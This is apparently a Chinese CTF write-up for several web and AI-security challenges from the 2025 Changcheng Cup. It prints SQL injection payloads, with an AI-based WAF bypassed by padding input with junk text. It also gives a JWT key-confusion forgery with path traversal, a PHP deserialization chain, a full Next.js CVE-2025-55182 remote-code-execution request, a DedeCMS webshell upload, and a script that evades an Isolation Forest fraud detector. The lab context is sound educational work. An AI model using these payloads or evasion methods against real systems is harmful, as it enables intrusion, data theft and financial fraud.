---
layout: post
title: '2025-长城杯-web'
date: "2025-12-29T00:50:07Z"
---
2025-长城杯-web
============

WEB
===

AI\_WAF
-------

开局一个搜索框，我们随便提交一下信息捉包

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083254444-1879558367.png)

有个query:

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083307354-217761289.png)

尝试单引号闭合，发现这里有注入  
![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083329233-501338303.png)

尝试注入，发现有ai判断

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083336868-1819438237.png)

我们这里尝试输入无意义长文段干扰ai判断，使得confidence下降值我们能够注入

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083344544-2126386636.png)

成功绕过

下面就是常规sql注入

    -1'union select 1,database(),3  --
    

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083355870-88424542.png)

得到nexadata

    -1'union select 1,group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = 'nexadata' -- 
    

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083406566-1672892190.png)

得到article,where\_is\_my\_flagggggg

    -1'union select 1,group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = 'where_is_my_flagggggg'
    

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083416502-551359541.png)

得到Th15\_ls\_f149

    -1'union select 1,group_concat(Th15_ls_f149), 3 FROM where_is_my_flagggggg 
    

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083426558-1707941594.png)

flag{f5312cd1-722b-4966-bfb8-9a8cbb400a40}

Deprecated
----------

[https://asal1n.github.io/2025/05/04/2025 CCB final/index.html](https://asal1n.github.io/2025/05/04/2025%20CCB%20final/index.html)

这里是去年长城杯final原题

我们注册两个账号，分别取出其session

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyIiwicHJpdmlsZWRnZSI6IlRlbXAgVXNlciIsImlhdCI6MTc2NjkxODcxM30.smlS5ce8-nub0S-eDJZZO\_cxbIzV0UBKGCH0gHkXjNiBVBGE69ddt2J8ZXQWButMllKvKXc8z-G2RAz-IUr\_dguWMsr21mZY-p0xkutVxo3w5BIvMInMDDzeE3nJpK6jkF84etm4DtiwqqYVAtIghVfVktzcbIQjJVEEM1wwPZU

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyIsInByaXZpbGVkZ2UiOiJUZW1wIFVzZXIiLCJpYXQiOjE3NjY5MTg3MzF9.aMrfucnb7VlcwIeFfXIZaxe22HyIOZQkBDSsRxAKxdSR84gbsCL4n3N1DGUTWPDYLiQO-qFbkSh7dF37lUilCYuv647\_g1y2l9YM6VsqYL6y8qT6\_Ea53VcnLM\_slGlae7TEUwfhSsstUMSqLZkYC1qx-aVjGJvQ53qqpLs-MQ8

[silentsignal/rsa\_sign2n: Deriving RSA public keys from message-signature pairs](https://github.com/silentsignal/rsa_sign2n/tree/release)

我们从这里下载脚本，通过脚本解密

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083436220-588582052.png)

生成了两个文件

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083439264-1994521195.png)

这里我们用e39595edbb089f70\_65537\_x509.pem

    const jwt = require('jsonwebtoken');
    const fs = require('fs');
    const publicKey  = fs.readFileSync('./e39595edbb089f70_65537_x509.pem', 'utf8');
    data={
        username: "admin", priviledge:'File-Priviledged-User'
    }
    data = Object.assign(data);
    console.log( jwt.sign(data, publicKey, { algorithm:'HS256'}))
    

得到新的session

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083446042-1253102842.png)

我们hackbar将老session替换

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083451015-71590699.png)

成为admin用户

然后我们捉包，将大佬文章里的exp直接打

    GET /checkfile?file[]=&file[]=&file[]=&file[]=&file[]=&file[]=&file[]=&file[]=&file[]=&file[]=../../../../../../../../flag.txt&file[]=.&file[]=log& HTTP/2
    Host: eci-2ze524ik705ih2la1l9i.cloudeci1.ichunqiu.com:8080
    Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1766199268; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicHJpdmlsZWRnZSI6IkZpbGUtUHJpdmlsZWRnZWQtVXNlciIsImlhdCI6MTc2NjkxOTEzN30.DpNIf5ZS2gI-7ASL-_Q4lAKT_fkzUr-wGStE6uhbUSM
    Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: cross-site
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
    Priority: u=0, i
    

得到flag

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083458214-301621214.png)

flag{b7685b18-397c-4138-ae78-660370596d18}

hellogate
---------

开局一张图片

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083812583-200219429.png)

Ctrl+u查看源代码未果，我们直接访问

    view-source:https://eci-2zea4i7m0byk99nsece3.cloudeci1.ichunqiu.com:80/
    

拉到尾部发现是一道php反序列化

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083645490-138540008.png)

    <?php
    error_reporting(0);
    class A {
        public $handle;
        public function triggerMethod() {
            echo "" . $this->handle; 
        }
    }
    class B {
        public $worker;
        public $cmd;
        public function __toString() {
            return $this->worker->result;
        }
    }
    class C {
        public $cmd;
        public function __get($name) {
            echo file_get_contents($this->cmd);
        }
    }
    $raw = isset($_POST['data']) ? $_POST['data'] : '';
    header('Content-Type: image/jpeg');
    readfile("muzujijiji.jpg");
    highlight_file(__FILE__);
    $obj = unserialize($_POST['data']);
    $obj->triggerMethod();
    

这条pop链子终点是`Class C` 中的 `__get()` 方法。它调用了 `file_get_contents($this->cmd)`，可以读取服务器上的文件

我们通过“当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数”触发\_\_get，于是我们将 `$worker` 设为 `Class C` 的对象，且 `C` 没有 `result` 属性

当对象被当作字符串处理时，会触发 `__toString`，我们通过 `Class A` `triggerMethod()` 得`echo "" . $this->handle;`，触发`__toString`

    <?php
    class A {
        public $handle;
    }
    
    class B {
        public $worker;
    }
    
    class C {
        public $cmd;
    }
    
    $c = new C();
    $c->cmd = "/flag"; 
    
    $b = new B();
    $b->worker = $c;
    
    $a = new A();
    $a->handle = $b;
    
    echo urlencode(serialize($a));
    ?>
    

我们运行得到

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083841064-676964973.png)

    data=O%3A1%3A%22A%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A6%3A%22worker%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D%7D
    

将请求方法改为post后，post传参data

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083900236-2138989602.png)

得到flag

flag{6590a341-0fd9-44ac-87f2-0dd03bf3279c}

redjs
-----

这题是最近比较热门得next.js的cve漏洞，CVE-2025-55182

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083904594-171853665.png)

我们用exp直接攻击

    POST / HTTP/1.1
    Host: eci-2ze62hcjqxqbhpvn23as.cloudeci1.ichunqiu.com:3000
    Next-Action: x
    X-Nextjs-Request-Id: ygdkgols
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
    X-Nextjs-Html-Request-Id: 0OySzliul7lMdEUPchXuS
    Content-Length: 751
    
    ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
    Content-Disposition: form-data; name="0"
    
    {
      "then":"$1:__proto__:then",
      "status":"resolved_model",
      "reason":-1,
      "value":"{\"then\":\"$B133\"}",
      "_response":{
        "_prefix":"var res=process.mainModule.require('child_process').execSync('cat /f*').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
        "_chunks":"$Q2",
        "_formData":{
          "get":"$1:constructor:constructor"
        }
      }
    }
    ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
    Content-Disposition: form-data; name="1"
    
    "$@0"
    ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
    Content-Disposition: form-data; name="2"
    
    []
    ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
    

得到flag

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083918133-452103734.png)

flag{d8f31aae-124e-4427-9560-92093163f31f}

dedecms
-------

dede框架之前在湾区杯决赛中见过，在/dede/login.php尝试弱口令admin/admin admin/123456后无果，遂注册账号登录

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083921253-1050870119.png)

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083923802-1444698566.png)

进入会员中心查找功能点，发现基本都是这个

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083928280-1500350923.png)

用自己邮箱注册发现也没收到邮件

偶然间看到新朋友那里有一个账号Aa123456789

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083923802-1444698566.png)

我们在/dede/login.php尝试弱口令登录Aa123456789/Aa123456789

成功进入

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083951903-1569906517.png)

继续找功能点，其中在专题管理那里有一个添加专题

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083953275-610026970.png)

这里有一个缩略图，我们传入图片木马捉包尝试

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229083953821-1994187849.png)

这里我们直接将filename改为1.php上传

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229084027858-2060447839.png)

上传成功

我们蚁剑添加，在相应的路径/uploads/allimg/251228/2-25122Q92A30-L.php连接，密码为shell

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229084031666-1593227920.png)

成功

在根目录那里直接找到flag.txt

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229084038319-1052557948.png)

flag{c62ec31c-a807-428a-9a00-72807c998405}

AI安全
====

The Silent Heist
----------------

题目提供了一份 `public_ledger.csv`，包含 1000 条被标记为“正常”的交易记录。每条记录有 20 个特征（`feat_0` 到 `feat_19`），其中 `feat_0` 是交易金额。

服务端通过 `nc 112.125.125.30 30833` 交互，要求我们上传 CSV 格式的伪造数据。

**限制条件**:

1.  **Isolation Forest 检测**: 提交的数据必须符合“正常”用户的行为模式。
2.  **黑名单检测**: 不能直接发送 `public_ledger.csv` 中的原始数据。
3.  **去重检测**: 不能大量发送重复的同一条数据。

最初尝试计算这 1000 条数据的均值（Mean）和协方差矩阵（Covariance Matrix），然后利用多元高斯分布（Multivariate Normal Distribution）生成新数据。  
然而，提交后被系统识别为“异常”。

后面发现，既然我们已经有了 1000 个确定的“安全点”（正常样本），最稳妥的策略是在这些安全点附近进行“微调”。

**算法步骤**:

1.  **重采样 (Resampling)**: 从原始的 1000 条数据中随机抽取样本。
2.  **添加噪声 (Noise Injection)**: 对抽取的样本添加极小的随机高斯噪声。
    *   噪声的大小设定为各特征标准差的 **1%** (`noise_scale = 0.01`)。
    *   这样可以保证生成的点在 20 维空间中依然紧紧围绕在原始“安全点”周围，处于 Isolation Forest 的高密度区域（即“正常”区域）。
    *   同时，由于引入了随机性，生成的每一个点在数值上都是唯一的，从而绕过了服务端的**黑名单**（精确匹配原始数据）和**去重**（精确匹配重复数据）检测。
3.  **累加**: 循环生成直到总金额（`feat_0` 的累加和）超过 $2,000,000。

    import numpy as np
    import socket
    import io
    import sys
    
    def solve():
        # 1. 加载正常数据
        data = np.genfromtxt('public_ledger.csv', delimiter=',', skip_header=1)
        
        # 2. 计算每一列的特征标准差，用于生成合适的噪声
        stds = np.std(data, axis=0)
        
        target_amount = 2000000
        current_amount = 0
        generated_data = []
        
        # 关键参数：噪声比例设为 1%
        noise_scale = 0.01 
        
        print(f"Generating data with noise scale {noise_scale}...")
        
        while current_amount < target_amount:
            # 3. 随机抽取原始样本
            indices = np.random.choice(len(data), 1000, replace=True)
            base_samples = data[indices]
            
            # 4. 加上微小的高斯噪声
            noise = np.random.normal(0, stds * noise_scale, base_samples.shape)
            new_samples = base_samples + noise
            
            # 确保金额非负
            new_samples[:, 0] = np.abs(new_samples[:, 0])
            
            generated_data.append(new_samples)
            current_amount += np.sum(new_samples[:, 0])
        
        final_data = np.vstack(generated_data)
        
        # 截取数据，刚好超过目标金额即可
        cum_sum = np.cumsum(final_data[:, 0])
        cutoff_idx = np.searchsorted(cum_sum, target_amount) + 1
        final_data = final_data[:cutoff_idx]
        
        print(f"Final dataset: {len(final_data)} samples, Amount: {np.sum(final_data[:, 0]):.2f}")
        
        # 格式化 CSV 输出
        header = "f0,f1,f2,f3,f4,f5,f6,f7,f8,f9,f10,f11,f12,f13,f14,f15,f16,f17,f18,f19"
        output = io.StringIO()
        output.write(header + "\n")
        np.savetxt(output, final_data, delimiter=",", fmt="%.16f")
        csv_content = output.getvalue()
        
        # 发送到服务器
        HOST = '60.205.252.190'
        PORT = 36881
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            # ... (发送逻辑省略) ...
    

运行脚本后，成功伪造了约 5700 条交易记录，总金额达到 201 万美元，且未触发异常警报。

![image](https://img2024.cnblogs.com/blog/3568664/202512/3568664-20251229084046489-1402225951.png)

**Flag**:  
`flag{afc64582-32f0-48a8-9193-7a3ddece960e}`